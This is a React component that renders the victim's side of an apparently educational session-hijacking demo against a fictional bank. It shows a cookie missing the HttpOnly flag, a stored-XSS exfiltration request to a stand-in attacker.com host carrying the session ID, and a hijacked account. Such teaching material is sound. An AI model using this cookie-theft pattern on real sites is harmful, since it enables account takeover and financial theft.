import React from 'react';

interface Props { currentScreen: string; onInteraction?: (action: string) => void; }

function BrowserChrome({ url, children }: { url: string; children: React.ReactNode }) {
    return (
        <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
            <div style={{ background: '#e2e8f0', padding: '8px 14px', display: 'flex', alignItems: 'center', gap: 12, flexShrink: 0, borderBottom: '1px solid #cbd5e1' }}>
                <div style={{ display: 'flex', gap: 6 }}>
                    {['#ff5f57','#ffbd2e','#28ca41'].map(c => <span key={c} style={{ display:'inline-block', width:12, height:12, borderRadius:'50%', background:c }} />)}
                </div>
                <div style={{ flex:1, background:'#f8fafc', padding:'4px 12px', borderRadius:4, fontSize:'0.78rem', fontFamily:'sans-serif', color:'#334155', display:'flex', alignItems:'center', gap:6 }}>
                    🔒 {url}
                </div>
            </div>
            <div style={{ flex: 1, overflowY: 'auto', position: 'relative' }}>{children}</div>
        </div>
    );
}

function BankDashboard({ watermark }: { watermark?: boolean }) {
    return (
        <div style={{ background: '#f8fafc', minHeight: '100%', fontFamily: 'sans-serif' }}>
            {/* Nav */}
            <div style={{ background: '#1e3a8a', padding: '12px 20px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', color: '#fff' }}>
                <b style={{ fontFamily:"'Orbitron',sans-serif", letterSpacing:1 }}>CORPBANK</b>
                <span style={{ fontSize: '0.85rem' }}>Welcome, <b>John Smith</b>&nbsp;|&nbsp;
                    <span style={{ fontSize: '0.75rem', opacity: 0.7 }}>john.smith@corpbank.com</span>
                </span>
            </div>
            {/* Alert banner for hijack screen */}
            {watermark && (
                <div style={{ background: '#fef2f2', borderBottom: '2px solid #ef4444', padding: '10px 20px', display: 'flex', alignItems: 'center', gap: 10 }}>
                    <span style={{ fontSize: '1rem' }}>🚨</span>
                    <span style={{ color: '#dc2626', fontWeight: 700, fontSize: '0.85rem' }}>Unauthorised transfer of $5,000 initiated to unknown account</span>
                </div>
            )}
            {/* Account card */}
            <div style={{ padding: '20px 24px' }}>
                <div style={{ background: 'linear-gradient(135deg,#1e3a8a,#2563eb)', borderRadius: 12, padding: '20px 24px', color: '#fff', marginBottom: 18 }}>
                    <div style={{ fontSize: '0.75rem', opacity: 0.7, marginBottom: 6 }}>CHECKING ACCOUNT</div>
                    <div style={{ fontSize: '1.8rem', fontWeight: 900 }}>$24,500<span style={{ fontSize: '0.9rem', opacity: 0.7 }}>.00</span></div>
                    <div style={{ marginTop: 12, fontSize: '0.75rem', opacity: 0.7 }}>Account: ****4892</div>
                </div>
                {/* Recent transactions */}
                <div style={{ fontSize: '0.78rem', color: '#94a3b8', marginBottom: 10 }}>RECENT TRANSACTIONS</div>
                {[
                    { desc: 'Grocery Store', amt: '-$84.20', date: 'Mar 10' },
                    { desc: 'Salary Deposit', amt: '+$4,200.00', date: 'Mar 01' },
                    { desc: 'Electric Bill', amt: '-$120.50', date: 'Feb 28' },
                ].map(t => (
                    <div key={t.desc} style={{ display: 'flex', justifyContent: 'space-between', padding: '10px 0', borderBottom: '1px solid #f1f5f9', fontSize: '0.85rem', color: '#334155' }}>
                        <span>{t.date} — {t.desc}</span>
                        <span style={{ color: t.amt.startsWith('+') ? '#16a34a' : '#dc2626', fontWeight: 700 }}>{t.amt}</span>
                    </div>
                ))}
            </div>
            {/* Attacker watermark */}
            {watermark && (
                <div style={{ position: 'fixed', bottom: 10, right: 10, background: 'rgba(220,38,38,0.9)', color: '#fff', padding: '4px 10px', borderRadius: 4, fontSize: '0.65rem', fontFamily:"'Share Tech Mono',monospace", letterSpacing: 1 }}>
                    ⚡ ATTACKER SESSION
                </div>
            )}
        </div>
    );
}

export default function SessHijackVictim({ currentScreen }: Props) {

    /* ── LOGGED-IN ── */
    if (currentScreen === 'logged-in') return (
        <BrowserChrome url="https://corpbank.com/dashboard">
            <BankDashboard />
        </BrowserChrome>
    );

    /* ── DEVTOOLS-OPEN ── */
    if (currentScreen === 'devtools-open') return (
        <BrowserChrome url="https://corpbank.com/dashboard">
            <div style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
                <div style={{ flex: 1, filter: 'brightness(0.75)', pointerEvents: 'none', overflow: 'hidden' }}>
                    <BankDashboard />
                </div>
                {/* DevTools panel */}
                <div style={{ height: 210, background: '#1e1e2e', borderTop: '2px solid #00d4ff', fontFamily:"'Share Tech Mono',monospace", fontSize: '0.7rem', display: 'flex', flexDirection: 'column' }}>
                    <div style={{ background: '#161625', display: 'flex', borderBottom: '1px solid #333', padding: '0 8px' }}>
                        {['Elements','Console','Network','Application'].map((t,i) => (
                            <div key={t} style={{ padding:'6px 14px', color:i===3?'#00d4ff':'#6b7280', borderBottom:i===3?'2px solid #00d4ff':'none', fontSize:'0.72rem' }}>{t}</div>
                        ))}
                    </div>
                    <div style={{ flex:1, padding:'10px 14px', overflowY:'auto', color:'#c8e6f0' }}>
                        <div style={{ color:'#6b86a0', marginBottom:8, fontSize:'0.68rem' }}>▶ Storage &gt; Cookies &gt; corpbank.com</div>
                        <div style={{ display:'grid', gridTemplateColumns:'100px 1fr 70px 65px 80px', gap:6, color:'#6b86a0', borderBottom:'1px solid rgba(255,255,255,0.08)', paddingBottom:4, marginBottom:6, fontSize:'0.67rem' }}>
                            <span>Name</span><span>Value</span><span>HttpOnly</span><span>Secure</span><span>SameSite</span>
                        </div>
                        <div style={{ display:'grid', gridTemplateColumns:'100px 1fr 70px 65px 80px', gap:6, padding:'6px 4px', borderRadius:4, fontSize:'0.67rem', background:'rgba(255,68,68,0.07)', border:'1px solid rgba(255,68,68,0.2)' }}>
                            <span style={{ color:'#bb88ff' }}>PHPSESSID</span>
                            <span style={{ color:'#fbbf24' }}>abc123def456xyz789</span>
                            <span style={{ color:'#ff4444', fontWeight:700 }}>✗ Missing</span>
                            <span style={{ color:'#ff4444', fontWeight:700 }}>✗ Missing</span>
                            <span style={{ color:'#ff4444', fontWeight:700 }}>✗ None</span>
                        </div>
                        <div style={{ marginTop:10, color:'#ff4444', fontSize:'0.68rem' }}>⚠ HttpOnly missing — JavaScript can read this cookie!</div>
                    </div>
                </div>
            </div>
        </BrowserChrome>
    );

    /* ── COOKIE-VISIBLE ── */
    if (currentScreen === 'cookie-visible') return (
        <BrowserChrome url="https://corpbank.com/dashboard">
            <div style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
                <div style={{ flex: 1, filter: 'brightness(0.65)', pointerEvents: 'none', overflow: 'hidden' }}>
                    <BankDashboard />
                </div>
                <div style={{ height: 220, background: '#1e1e2e', borderTop: '2px solid #ff4444', fontFamily:"'Share Tech Mono',monospace", fontSize: '0.7rem', display: 'flex', flexDirection: 'column' }}>
                    <div style={{ background: '#161625', display: 'flex', borderBottom: '1px solid #333', padding: '0 8px' }}>
                        {['Elements','Console','Network','Application'].map((t,i) => (
                            <div key={t} style={{ padding:'6px 14px', color:i===3?'#00d4ff':'#6b7280', borderBottom:i===3?'2px solid #00d4ff':'none', fontSize:'0.72rem' }}>{t}</div>
                        ))}
                    </div>
                    <div style={{ flex:1, padding:'10px 14px', overflowY:'auto', color:'#c8e6f0' }}>
                        <div style={{ display:'grid', gridTemplateColumns:'100px 1fr 70px 65px', gap:6, color:'#6b86a0', borderBottom:'1px solid rgba(255,255,255,0.08)', paddingBottom:4, marginBottom:6, fontSize:'0.67rem' }}>
                            <span>Name</span><span>Value</span><span>HttpOnly</span><span>Secure</span>
                        </div>
                        {/* pulsing cookie highlight */}
                        <div style={{ display:'grid', gridTemplateColumns:'100px 1fr 70px 65px', gap:6, padding:'8px 6px', borderRadius:4, border:'2px solid #ff4444', background:'rgba(255,68,68,0.12)', fontSize:'0.67rem', animation:'pulse 1.2s infinite' }}>
                            <span style={{ color:'#bb88ff' }}>PHPSESSID</span>
                            <span style={{ color:'#fbbf24', fontWeight:700 }}>abc123def456xyz789</span>
                            <span style={{ color:'#ff4444' }}>✗</span>
                            <span style={{ color:'#ff4444' }}>✗</span>
                        </div>
                        <div style={{ marginTop:10, display:'flex', alignItems:'center', gap:8, color:'#ff4444', fontSize:'0.68rem' }}>
                            <span style={{ fontSize:'1rem' }}>⬆</span>
                            <span>JavaScript can read this cookie! HttpOnly flag is NOT set.</span>
                        </div>
                    </div>
                </div>
            </div>
        </BrowserChrome>
    );

    /* ── COOKIE-STOLEN ── */
    if (currentScreen === 'cookie-stolen') return (
        <BrowserChrome url="https://corpbank.com/comments">
            <div style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
                <div style={{ flex: 1, filter: 'brightness(0.65)', padding: 16, background: '#f8fafc' }}>
                    <div style={{ fontSize: '0.9rem', color: '#334155', fontFamily: 'sans-serif', marginBottom: 12, fontWeight: 700 }}>Community Reports</div>
                    {['Great service!','Fast transfers','Responsive support'].map(c => (
                        <div key={c} style={{ padding: '8px 12px', borderBottom: '1px solid #e2e8f0', fontSize: '0.8rem', color: '#64748b', fontFamily: 'sans-serif' }}>💬 {c}</div>
                    ))}
                </div>
                {/* Network tab */}
                <div style={{ height: 200, background: '#1e1e2e', borderTop: '2px solid #ff4444', fontFamily:"'Share Tech Mono',monospace", fontSize: '0.7rem', display: 'flex', flexDirection: 'column' }}>
                    <div style={{ background: '#161625', display: 'flex', borderBottom: '1px solid #333', padding: '0 8px' }}>
                        {['Elements','Console','Network','Application'].map((t,i) => (
                            <div key={t} style={{ padding:'6px 14px', color:i===2?'#00d4ff':'#6b7280', borderBottom:i===2?'2px solid #00d4ff':'none', fontSize:'0.72rem' }}>{t}</div>
                        ))}
                    </div>
                    <div style={{ flex:1, padding:'10px 14px', overflowY:'auto', color:'#c8e6f0' }}>
                        <div style={{ color:'#6b86a0', marginBottom:8, fontSize:'0.68rem' }}>Filter: All | XHR | Fetch</div>
                        <div style={{ background:'rgba(255,68,68,0.1)', border:'1px solid rgba(255,68,68,0.35)', borderRadius:4, padding:'8px 10px' }}>
                            <div style={{ color:'#ff4444', fontWeight:700, marginBottom:4, fontSize:'0.7rem' }}>⬆ OUTGOING REQUEST DETECTED</div>
                            <div style={{ color:'#fbbf24', fontSize:'0.67rem', lineHeight:1.8 }}>
                                GET http://attacker.com/?c=abc123def456xyz789<br />
                                <span style={{ color:'#6b86a0' }}>Status:</span> <span style={{ color:'#ff4444' }}>Cookie being exfiltrated!</span><br />
                                <span style={{ color:'#6b86a0' }}>Time:</span> {new Date().toLocaleTimeString()}
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </BrowserChrome>
    );

    /* ── SESSION-HIJACKED ── */
    if (currentScreen === 'session-hijacked') return (
        <BrowserChrome url="https://corpbank.com/dashboard">
            <BankDashboard watermark />
        </BrowserChrome>
    );

    /* ── COMPROMISED ── */
    return (
        <div style={{ flex:1, background:'#0a0a1a', display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:14, padding:24 }}>
            <div style={{ fontSize:'5rem', lineHeight:1 }}>🔑</div>
            <div style={{ fontFamily:"'Orbitron',sans-serif", fontSize:'0.9rem', color:'#ff4444', letterSpacing:2 }}>SESSION FULLY HIJACKED</div>
            <div style={{ background:'rgba(255,68,68,0.08)', border:'1px solid rgba(255,68,68,0.3)', borderRadius:10, padding:16, width:'90%', maxWidth:300 }}>
                {[['Attack type','Stored XSS + Session Hijack'],['Cookie stolen','PHPSESSID'],['Transfer initiated','$5,000'],['Session active for','47 minutes'],['Victim aware','No']].map(([k,v]) => (
                    <div key={k} style={{ display:'flex', justifyContent:'space-between', padding:'5px 0', borderBottom:'1px solid rgba(255,255,255,0.05)', fontFamily:"'Share Tech Mono',monospace", fontSize:'0.74rem' }}>
                        <span style={{ color:'rgba(255,255,255,0.4)' }}>{k}:</span>
                        <span style={{ color:'#ff4444' }}>{v}</span>
                    </div>
                ))}
            </div>
        </div>
    );
}
